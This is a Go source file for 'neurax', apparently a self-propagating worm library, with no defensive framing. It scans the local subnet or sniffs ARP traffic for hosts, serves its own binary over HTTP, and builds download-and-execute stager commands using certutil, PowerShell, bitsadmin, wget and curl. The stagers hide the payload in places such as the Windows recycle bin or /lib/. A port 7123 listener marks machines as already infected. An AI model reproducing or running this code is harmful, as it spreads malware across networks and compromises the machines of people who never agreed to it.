package neurax

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type __neurax_config struct {
	stager           string
	port             int
	prevent_reinfect bool
	local_ip         string
	path             string
	file_name        string
	platform         string
	cidr             string
	scan_passive     bool
	threads          int
	full_range       bool
	base64           bool
	required_port    int
}

var neurax_config = __neurax_config{
	stager:           "random",
	port:             random_int(2222, 9999),
	required_port:    0,
	prevent_reinfect: true,
	local_ip:         get_local_ip(),
	path:             "random",
	file_name:        "random",
	platform:         runtime.GOOS,
	cidr:             get_local_ip() + "/24",
	scan_passive:     false,
	threads:          10,
	full_range:       false,
	base64:           false,
}

func contains_any(str string, elements []string) bool {
	for element := range elements {
		e := elements[element]
		if strings.Contains(str, e) {
			return true
		}
	}
	return false
}

func exit_on_error(err error) {
	if err != nil {
		os.Exit(0)
	}
}

func remove_from_slice(slice []string, elem string) []string {
	res := []string{}
	for _, e := range slice {
		if e != elem {
			res = append(res, elem)
		}
	}
	return res
}

func ip_increment(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func is_open(target string, port int) bool {
	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
	opened_ports := ps.GetOpenedPort(port-1, port+1)
	if len(opened_ports) != 0 {
		return true
	}
	return false
}

func expand_cidr(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); ip_increment(ip) {
		ips = append(ips, ip.String())
	}

	lenIPs := len(ips)
	switch {
	case lenIPs < 2:
		return ips, nil
	default:
		return ips[1 : len(ips)-1], nil
	}
}

func random_string(n int) string {
	rand.Seed(time.Now().UnixNano())
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func random_int(min int, max int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(max-min) + min
}

func b64d(str string) string {
	raw, _ := base64.StdEncoding.DecodeString(str)
	return fmt.Sprintf("%s", raw)
}

func b64e(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func get_local_ip() string {
	dns, err := net.Dial("udp", "8.8.8.8:80")
	exit_on_error(err)
	defer dns.Close()
	ip := dns.LocalAddr().(*net.UDPAddr).IP
	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

func random_select_str(list []string) string {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}

func random_select_str_nested(list [][]string) []string {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}

func neurax_stager() string {
	stagers := [][]string{}
	stager := []string{}
	paths := []string{}
	b64_decoder := ""
	windows_stagers := [][]string{
		[]string{"certutil", `certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
		[]string{"powershell", `Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
		[]string{"bitsadmin", `bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
	}
	linux_stagers := [][]string{
		[]string{"wget", `wget -O SAVE_PATH/FILENAME URL; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
		[]string{"curl", `curl URL/FILENAME > SAVE_PATH/FILENAME; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
	}
	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
		"/etc/", "/usr/", "/usr/share/"}
	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
	switch neurax_config.platform {
	case "windows":
		stagers = windows_stagers
		paths = windows_save_paths
		if neurax_config.base64 {
			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
	case "linux":
		stagers = linux_stagers
		paths = linux_save_paths
		if neurax_config.base64 {
			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
	}
	if neurax_config.stager == "random" {
		stager = random_select_str_nested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == neurax_config.stager {
				stager = st
			}
		}
	}
	selected_stager_command := stager[1]
	if neurax_config.path == "random" {
		neurax_config.path = random_select_str(paths)
	}
	if neurax_config.file_name == "random" && neurax_config.platform == "windows" {
		neurax_config.file_name += ".exe"
	}
	url := fmt.Sprintf("http://%s:%d/%s", neurax_config.local_ip, neurax_config.port, neurax_config.file_name)
	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", neurax_config.file_name, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", neurax_config.path, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
	return selected_stager_command
}

func neurax_server() {
	if neurax_config.prevent_reinfect {
		go net.Listen("tcp", "0.0.0.0:7123")
	}
	data, _ := ioutil.ReadFile(os.Args[0])
	if neurax_config.base64 {
		data = []byte(b64e(string(data)))
	}
	addr := fmt.Sprintf(":%d", neurax_config.port)
	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		http.ServeContent(rw, r, neurax_config.file_name, time.Now(), bytes.NewReader(data))
	}))
}

func neurax_scan(c chan string) {
	if neurax_config.scan_passive {
		var snapshot_len int32 = 1024
		var timeout time.Duration = 500000 * time.Second
		devices, err := pcap.FindAllDevs()
		exit_on_error(err)
		for _, device := range devices {
			handler, err := pcap.OpenLive(device.Name, snapshot_len, false, timeout)
			exit_on_error(err)
			handler.SetBPFFilter("arp")
			defer handler.Close()
			packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
			for packet := range packetSource.Packets() {
				ip_layer := packet.Layer(layers.LayerTypeIPv4)
				if ip_layer != nil {
					ip, _ := ip_layer.(*layers.IPv4)
					source := fmt.Sprintf("%s", ip.SrcIP)
					destination := fmt.Sprintf("%s", ip.DstIP)
					c <- source
					c <- destination
				}
			}
		}
	} else {
		targets, err := expand_cidr(neurax_config.cidr)
		targets = remove_from_slice(targets, get_local_ip())
		exit_on_error(err)
		for _, target := range targets {
			ps := portscanner.NewPortScanner(target, time.Duration(2)*time.Second, neurax_config.threads)
			first := 19
			last := 300
			if neurax_config.full_range {
				last = 65535
			}
			opened_ports := ps.GetOpenedPort(first, last)
			if len(opened_ports) != 0 && !is_open(target, 7123) {
				if neurax_config.required_port == 0 {
					c <- target
				} else {
					if is_open(target, neurax_config.required_port) {
						c <- target
					}
				}
			}
		}
	}
}
